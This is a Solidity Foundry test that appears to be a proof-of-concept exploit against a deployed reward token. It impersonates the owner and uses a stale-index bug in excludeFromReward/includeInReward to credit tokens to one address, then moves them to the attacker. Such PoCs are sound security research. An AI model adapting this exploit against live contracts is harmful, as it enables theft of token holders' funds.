pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface INFTMarvelFan {
    function owner() external view returns (address);
    function excludeFromReward(address account) external;
    function includeInReward(address account) external;
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xd0D486034C857ab4BA532ea053E2E7A32cdc23Ab;
    address attacker = address(this);
    address addressA;
    address addressC;
    address addressD;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        addressA = vm.addr(1);
        addressC = vm.addr(2);
        addressD = vm.addr(3);
        vm.label(addressA, "Address A");
        vm.label(addressC, "Address C");
        vm.label(addressD, "Address D");

        deal(TARGET, addressC, 1e12);
        deal(TARGET, addressD, 1e12);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = IERC20(0xd0D486034C857ab4BA532ea053E2E7A32cdc23Ab).balanceOf(address(this));
        address owner = INFTMarvelFan(TARGET).owner();

        vm.startPrank(owner);

        // 1. Exclude A
        INFTMarvelFan(TARGET).excludeFromReward(addressA);

        // 2. Exclude C
        INFTMarvelFan(TARGET).excludeFromReward(addressC);

        // 3. Include A, which moves C to index 0 but its ID remains stale (2)
        INFTMarvelFan(TARGET).includeInReward(addressA);

        // 4. Exclude D, which now shares the same ID as C (2)
        INFTMarvelFan(TARGET).excludeFromReward(addressD);

        // 5. Include C. This uses the stale ID and mistakenly removes D from the _excluded array.
        INFTMarvelFan(TARGET).includeInReward(addressC);

        // 6. Exclude C again. The desynchronized state leads to a faulty rate calculation, minting tokens to C.
        INFTMarvelFan(TARGET).excludeFromReward(addressC);

        vm.stopPrank();

        // 7. Transfer the minted tokens from C to the attacker.
        uint256 profit = INFTMarvelFan(TARGET).balanceOf(addressC);
        vm.prank(addressC);
        INFTMarvelFan(TARGET).transfer(attacker, profit);
        uint256 finalBalance = IERC20(0xd0D486034C857ab4BA532ea053E2E7A32cdc23Ab).balanceOf(address(this));
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

